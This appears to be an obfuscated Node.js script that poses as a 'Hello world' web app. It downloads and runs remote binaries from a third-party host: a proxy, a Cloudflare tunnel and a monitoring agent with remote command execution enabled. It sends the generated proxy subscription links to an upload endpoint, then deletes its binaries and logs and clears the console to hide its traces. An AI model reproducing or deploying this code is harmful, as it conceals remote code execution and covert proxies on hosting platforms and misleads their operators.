const _0x4297b4=_0xc670;(function(_0x3676d7,_0x547ed2){const _0x271fd7=_0xc670,_0x18c3e4=_0x3676d7();while(!![]){try{const _0x22d4bb=parseInt(_0x271fd7(0x15e))/0x1+-parseInt(_0x271fd7(0x1c5))/0x2+-parseInt(_0x271fd7(0x18a))/0x3+-parseInt(_0x271fd7(0x1a3))/0x4*(parseInt(_0x271fd7(0x192))/0x5)+parseInt(_0x271fd7(0x1ec))/0x6*(parseInt(_0x271fd7(0x18c))/0x7)+-parseInt(_0x271fd7(0x1d9))/0x8+parseInt(_0x271fd7(0x1bd))/0x9*(parseInt(_0x271fd7(0x1bf))/0xa);if(_0x22d4bb===_0x547ed2)break;else _0x18c3e4['push'](_0x18c3e4['shift']());}catch(_0x2bee28){_0x18c3e4['push'](_0x18c3e4['shift']());}}}(_0x400f,0xa3e48));const express=require(_0x4297b4(0x208)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x4297b4(0x171)),{promisify}=require(_0x4297b4(0x1e4)),exec=promisify(require(_0x4297b4(0x162))[_0x4297b4(0x1ba)]),{execSync}=require(_0x4297b4(0x162)),UPLOAD_URL=process['env'][_0x4297b4(0x20c)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x4297b4(0x205)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x4297b4(0x205)]['FILE_PATH']||_0x4297b4(0x1ee),SUB_PATH=process['env'][_0x4297b4(0x1f5)]||_0x4297b4(0x1ca),PORT=process[_0x4297b4(0x205)][_0x4297b4(0x1ad)]||process[_0x4297b4(0x205)][_0x4297b4(0x18d)]||0xbb8,UUID=process[_0x4297b4(0x205)][_0x4297b4(0x1a8)]||_0x4297b4(0x16b),NEZHA_SERVER=process[_0x4297b4(0x205)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x4297b4(0x205)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4297b4(0x205)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x4297b4(0x205)][_0x4297b4(0x164)]||'',ARGO_AUTH=process[_0x4297b4(0x205)][_0x4297b4(0x15b)]||'',ARGO_PORT=process[_0x4297b4(0x205)][_0x4297b4(0x16f)]||0x1f41,CFIP=process[_0x4297b4(0x205)][_0x4297b4(0x1f6)]||_0x4297b4(0x1e9),CFPORT=process['env'][_0x4297b4(0x1d0)]||0x1bb,NAME=process[_0x4297b4(0x205)]['NAME']||_0x4297b4(0x169);!fs[_0x4297b4(0x1c8)](FILE_PATH)?(fs[_0x4297b4(0x1fb)](FILE_PATH),console[_0x4297b4(0x15d)](FILE_PATH+_0x4297b4(0x17a))):console[_0x4297b4(0x15d)](FILE_PATH+_0x4297b4(0x1b9));let npmPath=path[_0x4297b4(0x18b)](FILE_PATH,_0x4297b4(0x1ed)),phpPath=path[_0x4297b4(0x18b)](FILE_PATH,_0x4297b4(0x177)),webPath=path[_0x4297b4(0x18b)](FILE_PATH,_0x4297b4(0x1de)),botPath=path[_0x4297b4(0x18b)](FILE_PATH,_0x4297b4(0x1aa)),subPath=path[_0x4297b4(0x18b)](FILE_PATH,_0x4297b4(0x1e5)),listPath=path['join'](FILE_PATH,_0x4297b4(0x17e)),bootLogPath=path[_0x4297b4(0x18b)](FILE_PATH,'boot.log'),configPath=path[_0x4297b4(0x18b)](FILE_PATH,_0x4297b4(0x1ce));function deleteNodes(){const _0xd1919e=_0x4297b4;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x382ae0;try{_0x382ae0=fs['readFileSync'](subPath,_0xd1919e(0x1cf));}catch{return null;}const _0xd39d52=Buffer[_0xd1919e(0x1db)](_0x382ae0,_0xd1919e(0x1f2))[_0xd1919e(0x1c4)](_0xd1919e(0x1cf)),_0x112247=_0xd39d52[_0xd1919e(0x1c0)]('\x0a')[_0xd1919e(0x1f4)](_0x2442b9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xd1919e(0x20f)](_0x2442b9));if(_0x112247[_0xd1919e(0x1d6)]===0x0)return;return axios[_0xd1919e(0x1c7)](UPLOAD_URL+_0xd1919e(0x182),JSON[_0xd1919e(0x19f)]({'nodes':_0x112247}),{'headers':{'Content-Type':_0xd1919e(0x1b7)}})[_0xd1919e(0x17b)](_0x2559bd=>{return null;});}catch(_0x24ca2a){return null;}}function cleanupOldFiles(){const _0x499a4d=_0x4297b4,_0x3a19ad=[_0x499a4d(0x1de),_0x499a4d(0x1aa),_0x499a4d(0x1ed),_0x499a4d(0x177),'sub.txt',_0x499a4d(0x186)];_0x3a19ad['forEach'](_0x3d0669=>{const _0x5d0dff=_0x499a4d,_0x4ca2f0=path[_0x5d0dff(0x18b)](FILE_PATH,_0x3d0669);fs['unlink'](_0x4ca2f0,()=>{});});}function _0xc670(_0x34ba92,_0x3f519b){const _0x400f0a=_0x400f();return _0xc670=function(_0xc670d0,_0x519cc7){_0xc670d0=_0xc670d0-0x15b;let _0x3fc5e6=_0x400f0a[_0xc670d0];return _0x3fc5e6;},_0xc670(_0x34ba92,_0x3f519b);}app['get']('/',function(_0x3b261f,_0x97fdce){const _0x196aef=_0x4297b4;_0x97fdce[_0x196aef(0x194)](_0x196aef(0x193));});const config={'log':{'access':_0x4297b4(0x19c),'error':'/dev/null','loglevel':_0x4297b4(0x1b4)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x4297b4(0x181)}],'decryption':_0x4297b4(0x1b4),'fallbacks':[{'dest':0xbb9},{'path':_0x4297b4(0x180),'dest':0xbba},{'path':_0x4297b4(0x176),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x4297b4(0x1af),'protocol':_0x4297b4(0x199),'settings':{'clients':[{'id':UUID}],'decryption':_0x4297b4(0x1b4)},'streamSettings':{'network':_0x4297b4(0x1fd),'security':_0x4297b4(0x1b4)}},{'port':0xbba,'listen':_0x4297b4(0x1af),'protocol':_0x4297b4(0x199),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4297b4(0x1b4)},'streamSettings':{'network':'ws','security':_0x4297b4(0x1b4),'wsSettings':{'path':_0x4297b4(0x180)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4297b4(0x1e2),_0x4297b4(0x206)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4297b4(0x1af),'protocol':_0x4297b4(0x1f0),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4297b4(0x176)}},'sniffing':{'enabled':!![],'destOverride':[_0x4297b4(0x1b1),_0x4297b4(0x1e2),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4297b4(0x1af),'protocol':_0x4297b4(0x173),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4297b4(0x1b4),'wsSettings':{'path':_0x4297b4(0x19b)}},'sniffing':{'enabled':!![],'destOverride':[_0x4297b4(0x1b1),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x4297b4(0x200),'tag':_0x4297b4(0x1f7)},{'protocol':_0x4297b4(0x16c),'tag':_0x4297b4(0x1bc)}]};fs[_0x4297b4(0x198)](path[_0x4297b4(0x18b)](FILE_PATH,_0x4297b4(0x1ce)),JSON[_0x4297b4(0x19f)](config,null,0x2));function getSystemArchitecture(){const _0x4d19ee=_0x4297b4,_0x4e220d=os[_0x4d19ee(0x168)]();return _0x4e220d==='arm'||_0x4e220d===_0x4d19ee(0x1d2)||_0x4e220d===_0x4d19ee(0x175)?_0x4d19ee(0x1df):_0x4d19ee(0x1a2);}function downloadFile(_0x43987c,_0x517714,_0xc6b728){const _0x1c0ad5=_0x4297b4,_0x38b325=path[_0x1c0ad5(0x18b)](FILE_PATH,_0x43987c),_0x4265df=fs['createWriteStream'](_0x38b325);axios({'method':_0x1c0ad5(0x187),'url':_0x517714,'responseType':'stream'})[_0x1c0ad5(0x1f1)](_0x373857=>{const _0x376ff4=_0x1c0ad5;_0x373857[_0x376ff4(0x1d7)][_0x376ff4(0x1d8)](_0x4265df),_0x4265df['on'](_0x376ff4(0x1e8),()=>{const _0x590b4b=_0x376ff4;_0x4265df[_0x590b4b(0x1fc)](),console['log'](_0x590b4b(0x203)+_0x43987c+_0x590b4b(0x1ef)),_0xc6b728(null,_0x43987c);}),_0x4265df['on'](_0x376ff4(0x1ea),_0xa4ccf8=>{const _0x102ce0=_0x376ff4;fs[_0x102ce0(0x196)](_0x38b325,()=>{});const _0x231dbd=_0x102ce0(0x203)+_0x43987c+_0x102ce0(0x1b2)+_0xa4ccf8['message'];console[_0x102ce0(0x1ea)](_0x231dbd),_0xc6b728(_0x231dbd);});})['catch'](_0x540653=>{const _0x411e0f=_0x1c0ad5,_0x21f333=_0x411e0f(0x203)+_0x43987c+'\x20failed:\x20'+_0x540653[_0x411e0f(0x178)];console[_0x411e0f(0x1ea)](_0x21f333),_0xc6b728(_0x21f333);});}async function downloadFilesAndRun(){const _0x42cee6=_0x4297b4,_0x85a93=getSystemArchitecture(),_0x39a14d=getFilesForArchitecture(_0x85a93);if(_0x39a14d[_0x42cee6(0x1d6)]===0x0){console[_0x42cee6(0x15d)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x2908aa=_0x39a14d[_0x42cee6(0x163)](_0x29a9b6=>{return new Promise((_0x4c5ed5,_0x29c6bf)=>{const _0x2cd8ca=_0xc670;downloadFile(_0x29a9b6['fileName'],_0x29a9b6[_0x2cd8ca(0x1a0)],(_0xb0a59e,_0x717db2)=>{_0xb0a59e?_0x29c6bf(_0xb0a59e):_0x4c5ed5(_0x717db2);});});});try{await Promise[_0x42cee6(0x1da)](_0x2908aa);}catch(_0x1f4983){console[_0x42cee6(0x1ea)](_0x42cee6(0x1b8),_0x1f4983);return;}function _0x21bc83(_0x1a510d){const _0x24dbdd=_0x42cee6,_0x434065=0x1fd;_0x1a510d[_0x24dbdd(0x1a7)](_0x546e5b=>{const _0x3bec93=_0x24dbdd,_0x12385a=path[_0x3bec93(0x18b)](FILE_PATH,_0x546e5b);fs[_0x3bec93(0x1c8)](_0x12385a)&&fs[_0x3bec93(0x1f8)](_0x12385a,_0x434065,_0x434a08=>{const _0x29cb92=_0x3bec93;_0x434a08?console[_0x29cb92(0x1ea)](_0x29cb92(0x17d)+_0x12385a+':\x20'+_0x434a08):console['log'](_0x29cb92(0x16e)+_0x12385a+':\x20'+_0x434065[_0x29cb92(0x1c4)](0x8));});});}const _0x490ff9=NEZHA_PORT?['./npm','./web',_0x42cee6(0x1b0)]:[_0x42cee6(0x1c9),'./web',_0x42cee6(0x1b0)];_0x21bc83(_0x490ff9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4fb0c1=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x42cee6(0x1c0)](':')[_0x42cee6(0x1c3)]():'',_0x24d2da=new Set([_0x42cee6(0x174),_0x42cee6(0x1a4),_0x42cee6(0x1b3),_0x42cee6(0x18e),_0x42cee6(0x19a),_0x42cee6(0x1ff)]),_0x3f9939=_0x24d2da[_0x42cee6(0x1d4)](_0x4fb0c1)?'true':_0x42cee6(0x190),_0x6a2b2b=_0x42cee6(0x1be)+NEZHA_KEY+_0x42cee6(0x1fa)+NEZHA_SERVER+_0x42cee6(0x16a)+_0x3f9939+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x42cee6(0x198)](path[_0x42cee6(0x18b)](FILE_PATH,_0x42cee6(0x207)),_0x6a2b2b);const _0x1d5ff8=_0x42cee6(0x1c1)+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1d5ff8),console[_0x42cee6(0x15d)]('php\x20is\x20running'),await new Promise(_0x36779c=>setTimeout(_0x36779c,0x3e8));}catch(_0x58d5d2){console[_0x42cee6(0x1ea)](_0x42cee6(0x1ae)+_0x58d5d2);}}else{let _0x289218='';const _0x37a5e7=[_0x42cee6(0x174),'8443','2096',_0x42cee6(0x18e),_0x42cee6(0x19a),_0x42cee6(0x1ff)];_0x37a5e7['includes'](NEZHA_PORT)&&(_0x289218=_0x42cee6(0x170));const _0x51da1b=_0x42cee6(0x1c1)+FILE_PATH+'/npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x289218+_0x42cee6(0x1cc);try{await exec(_0x51da1b),console[_0x42cee6(0x15d)](_0x42cee6(0x204)),await new Promise(_0x56a14f=>setTimeout(_0x56a14f,0x3e8));}catch(_0x11450e){console['error'](_0x42cee6(0x1b6)+_0x11450e);}}}else console[_0x42cee6(0x15d)](_0x42cee6(0x167));const _0x5dfe16='nohup\x20'+FILE_PATH+_0x42cee6(0x17c)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5dfe16),console[_0x42cee6(0x15d)](_0x42cee6(0x1cb)),await new Promise(_0x4af0a3=>setTimeout(_0x4af0a3,0x3e8));}catch(_0xd5a8c0){console['error'](_0x42cee6(0x201)+_0xd5a8c0);}if(fs[_0x42cee6(0x1c8)](path[_0x42cee6(0x18b)](FILE_PATH,'bot'))){let _0x208526;if(ARGO_AUTH[_0x42cee6(0x1dd)](/^[A-Z0-9a-z=]{120,250}$/))_0x208526=_0x42cee6(0x1e0)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x208526=_0x42cee6(0x202)+FILE_PATH+_0x42cee6(0x1eb):_0x208526=_0x42cee6(0x1ab)+FILE_PATH+_0x42cee6(0x1c6)+ARGO_PORT;try{await exec(_0x42cee6(0x1c1)+FILE_PATH+_0x42cee6(0x17f)+_0x208526+_0x42cee6(0x1cc)),console[_0x42cee6(0x15d)](_0x42cee6(0x188)),await new Promise(_0x57c13c=>setTimeout(_0x57c13c,0x7d0));}catch(_0x38d84b){console[_0x42cee6(0x1ea)](_0x42cee6(0x1b5)+_0x38d84b);}}await new Promise(_0x2f78c1=>setTimeout(_0x2f78c1,0x1388));}function getFilesForArchitecture(_0x20c8ba){const _0x4a236a=_0x4297b4;let _0x2d985f;_0x20c8ba===_0x4a236a(0x1df)?_0x2d985f=[{'fileName':'web','fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0x4a236a(0x1aa),'fileUrl':_0x4a236a(0x183)}]:_0x2d985f=[{'fileName':_0x4a236a(0x1de),'fileUrl':_0x4a236a(0x185)},{'fileName':_0x4a236a(0x1aa),'fileUrl':_0x4a236a(0x165)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x318778=_0x20c8ba===_0x4a236a(0x1df)?_0x4a236a(0x1e7):_0x4a236a(0x19d);_0x2d985f[_0x4a236a(0x1bb)]({'fileName':'npm','fileUrl':_0x318778});}else{const _0x5d53d7=_0x20c8ba===_0x4a236a(0x1df)?_0x4a236a(0x1a1):'https://amd64.ssss.nyc.mn/v1';_0x2d985f['unshift']({'fileName':'php','fileUrl':_0x5d53d7});}}return _0x2d985f;}function argoType(){const _0x2ea340=_0x4297b4;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2ea340(0x15d)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2ea340(0x1d5)](_0x2ea340(0x1a5))){fs[_0x2ea340(0x198)](path[_0x2ea340(0x18b)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x316812=_0x2ea340(0x1e1)+ARGO_AUTH[_0x2ea340(0x1c0)]('\x22')[0xb]+_0x2ea340(0x1f3)+path[_0x2ea340(0x18b)](FILE_PATH,_0x2ea340(0x197))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x2ea340(0x198)](path[_0x2ea340(0x18b)](FILE_PATH,_0x2ea340(0x172)),_0x316812);}else console['log'](_0x2ea340(0x1e3));}argoType();async function extractDomains(){const _0x48e2e5=_0x4297b4;let _0xe07342;if(ARGO_AUTH&&ARGO_DOMAIN)_0xe07342=ARGO_DOMAIN,console['log'](_0x48e2e5(0x1cd),_0xe07342),await _0xd14cb9(_0xe07342);else try{const _0x15a0a5=fs['readFileSync'](path[_0x48e2e5(0x18b)](FILE_PATH,_0x48e2e5(0x186)),'utf-8'),_0x4df6ef=_0x15a0a5[_0x48e2e5(0x1c0)]('\x0a'),_0x3ced75=[];_0x4df6ef[_0x48e2e5(0x1a7)](_0x3f1efe=>{const _0x1a3b95=_0x48e2e5,_0x4b9f81=_0x3f1efe[_0x1a3b95(0x1dd)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4b9f81){const _0x4c3ae4=_0x4b9f81[0x1];_0x3ced75[_0x1a3b95(0x1a9)](_0x4c3ae4);}});if(_0x3ced75['length']>0x0)_0xe07342=_0x3ced75[0x0],console[_0x48e2e5(0x15d)](_0x48e2e5(0x1dc),_0xe07342),await _0xd14cb9(_0xe07342);else{console[_0x48e2e5(0x15d)](_0x48e2e5(0x15f)),fs[_0x48e2e5(0x160)](path['join'](FILE_PATH,'boot.log'));async function _0x37e909(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x3ccf6b){}}_0x37e909(),await new Promise(_0x3e02cd=>setTimeout(_0x3e02cd,0xbb8));const _0x54c68f=_0x48e2e5(0x1ab)+FILE_PATH+_0x48e2e5(0x1c6)+ARGO_PORT;try{await exec('nohup\x20'+path[_0x48e2e5(0x18b)](FILE_PATH,_0x48e2e5(0x1aa))+'\x20'+_0x54c68f+'\x20>/dev/null\x202>&1\x20&'),console['log'](_0x48e2e5(0x189)),await new Promise(_0x371ecd=>setTimeout(_0x371ecd,0xbb8)),await extractDomains();}catch(_0x1d7383){console[_0x48e2e5(0x1ea)](_0x48e2e5(0x1b5)+_0x1d7383);}}}catch(_0x106445){console[_0x48e2e5(0x1ea)]('Error\x20reading\x20boot.log:',_0x106445);}async function _0xd14cb9(_0x1089a2){const _0x5083b4=_0x48e2e5,_0x176555=execSync(_0x5083b4(0x1a6),{'encoding':_0x5083b4(0x1cf)}),_0x3d7ffd=_0x176555[_0x5083b4(0x179)]();return new Promise(_0x27d0c8=>{setTimeout(()=>{const _0x1e941a=_0xc670,_0x1acb0b={'v':'2','ps':NAME+'-'+_0x3d7ffd,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1e941a(0x1b4),'net':'ws','type':_0x1e941a(0x1b4),'host':_0x1089a2,'path':_0x1e941a(0x20a),'tls':_0x1e941a(0x1e2),'sni':_0x1089a2,'alpn':''},_0x5c5b0d=_0x1e941a(0x1ac)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1089a2+'&type=ws&host='+_0x1089a2+'&path=%2Fvless-argo%3Fed%3D2560#'+NAME+'-'+_0x3d7ffd+'\x0a\x20\x20\x0avmess://'+Buffer[_0x1e941a(0x1db)](JSON['stringify'](_0x1acb0b))['toString'](_0x1e941a(0x1f2))+_0x1e941a(0x1d3)+UUID+'@'+CFIP+':'+CFPORT+_0x1e941a(0x1d1)+_0x1089a2+'&type=ws&host='+_0x1089a2+_0x1e941a(0x19e)+NAME+'-'+_0x3d7ffd+_0x1e941a(0x1f9);console[_0x1e941a(0x15d)](Buffer[_0x1e941a(0x1db)](_0x5c5b0d)[_0x1e941a(0x1c4)](_0x1e941a(0x1f2))),fs['writeFileSync'](subPath,Buffer[_0x1e941a(0x1db)](_0x5c5b0d)['toString'](_0x1e941a(0x1f2))),console[_0x1e941a(0x15d)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uplodNodes(),app['get']('/'+SUB_PATH,(_0x186da3,_0x3ca4b3)=>{const _0x1de9db=_0x1e941a,_0x284e65=Buffer[_0x1de9db(0x1db)](_0x5c5b0d)[_0x1de9db(0x1c4)](_0x1de9db(0x1f2));_0x3ca4b3[_0x1de9db(0x209)](_0x1de9db(0x166),_0x1de9db(0x1fe)),_0x3ca4b3['send'](_0x284e65);}),_0x27d0c8(_0x5c5b0d);},0x7d0);});}}async function uplodNodes(){const _0x1346d8=_0x4297b4;if(UPLOAD_URL&&PROJECT_URL){const _0x2d1986=PROJECT_URL+'/'+SUB_PATH,_0x5976bb={'subscription':[_0x2d1986]};try{const _0x1555ff=await axios[_0x1346d8(0x1c7)](UPLOAD_URL+_0x1346d8(0x20d),_0x5976bb,{'headers':{'Content-Type':_0x1346d8(0x1b7)}});if(_0x1555ff['status']===0xc8)console[_0x1346d8(0x15d)](_0x1346d8(0x184));else return null;}catch(_0x374199){if(_0x374199[_0x1346d8(0x191)]){if(_0x374199[_0x1346d8(0x191)][_0x1346d8(0x20e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1346d8(0x1c8)](listPath))return;const _0x2434de=fs['readFileSync'](listPath,_0x1346d8(0x1cf)),_0x481442=_0x2434de[_0x1346d8(0x1c0)]('\x0a')[_0x1346d8(0x1f4)](_0x1c1fe9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1346d8(0x20f)](_0x1c1fe9));if(_0x481442[_0x1346d8(0x1d6)]===0x0)return;const _0x814f81=JSON['stringify']({'nodes':_0x481442});try{await axios[_0x1346d8(0x1c7)](UPLOAD_URL+_0x1346d8(0x15c),_0x814f81,{'headers':{'Content-Type':_0x1346d8(0x1b7)}});if(response[_0x1346d8(0x20e)]===0xc8)console[_0x1346d8(0x15d)](_0x1346d8(0x184));else return null;}catch(_0x125a55){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x26fd7e=_0xc670,_0x2133bb=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x2133bb[_0x26fd7e(0x1a9)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2133bb['push'](phpPath);exec(_0x26fd7e(0x18f)+_0x2133bb[_0x26fd7e(0x18b)]('\x20')+'\x20>/dev/null\x202>&1',_0x3009f1=>{const _0x39c735=_0x26fd7e;console[_0x39c735(0x20b)](),console[_0x39c735(0x15d)](_0x39c735(0x1e6)),console[_0x39c735(0x15d)](_0x39c735(0x195));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1f646a=_0x4297b4;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1f646a(0x15d)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x1b421c=await axios['post'](_0x1f646a(0x16d),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1f646a(0x1b7)}});console[_0x1f646a(0x15d)]('automatic\x20access\x20task\x20added\x20successfully');}catch(_0x2715eb){console[_0x1f646a(0x1ea)](_0x1f646a(0x161)+_0x2715eb[_0x1f646a(0x178)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console[_0x4297b4(0x15d)](_0x4297b4(0x1c2)+PORT+'!'));function _0x400f(){const _0x24d503=['https://amd64.ssss.nyc.mn/web','boot.log','get','bot\x20is\x20running','bot\x20is\x20running.','1260303KjNoji','join','121135HTxkCY','PORT','2087','rm\x20-rf\x20','false','response','96835TZEjIg','Hello\x20world!','send','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','unlink','tunnel.json','writeFileSync','vless','2083','/trojan-argo','/dev/null','https://amd64.ssss.nyc.mn/agent','&path=%2Ftrojan-argo%3Fed%3D2560#','stringify','fileUrl','https://arm64.ssss.nyc.mn/v1','amd','76UPNouW','8443','TunnelSecret','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','forEach','UUID','push','bot','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0avless://','SERVER_PORT','php\x20running\x20error:\x20','127.0.0.1','./bot','http','\x20failed:\x20','2096','none','Error\x20executing\x20command:\x20','npm\x20running\x20error:\x20','application/json','Error\x20downloading\x20files:','\x20already\x20exists','exec','unshift','block','465138WODKYn','\x0aclient_secret:\x20','630WSHqHS','split','nohup\x20','http\x20server\x20is\x20running\x20on\x20port:','pop','toString','2306730RXaVti','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','post','existsSync','./php','sub','web\x20is\x20running','\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN:','config.json','utf-8','CFPORT','?security=tls&sni=','arm64','\x0a\x20\x20\x0atrojan://','has','includes','length','data','pipe','9115088yELNVM','all','from','ArgoDomain:','match','web','arm','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0a\x20\x20tunnel:\x20','tls','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','util','sub.txt','App\x20is\x20running','https://arm64.ssss.nyc.mn/agent','finish','www.visa.com.sg','error','/tunnel.yml\x20run','90EehYfB','npm','./tmp','\x20successfully','vmess','then','base64','\x0a\x20\x20credentials-file:\x20','filter','SUB_PATH','CFIP','direct','chmod','\x0a\x20\x20\x20\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','mkdirSync','close','tcp','text/plain;\x20charset=utf-8','2053','freedom','web\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Download\x20','npm\x20is\x20running','env','quic','config.yaml','express','set','/vmess-argo?ed=2560','clear','UPLOAD_URL','/api/add-subscriptions','status','test','ARGO_AUTH','/api/add-nodes','log','236588xCGLuz','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','unlinkSync','添加URL失败:\x20','child_process','map','ARGO_DOMAIN','https://amd64.ssss.nyc.mn/2go','Content-Type','NEZHA\x20variable\x20is\x20empty,skip\x20running','arch','Vls','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','9afd1229-b893-40c1-84dd-51e7ce204913','blackhole','https://oooo.serv00.net/add-url','Empowerment\x20success\x20for\x20','ARGO_PORT','--tls','path','tunnel.yml','trojan','443','aarch64','/vmess-argo','php','message','trim','\x20is\x20created','catch','/web\x20-c\x20','Empowerment\x20failed\x20for\x20','list.txt','/bot\x20','/vless-argo','xtls-rprx-vision','/api/delete-nodes','https://arm64.ssss.nyc.mn/2go','Subscription\x20uploaded\x20successfully'];_0x400f=function(){return _0x24d503;};return _0x400f();}
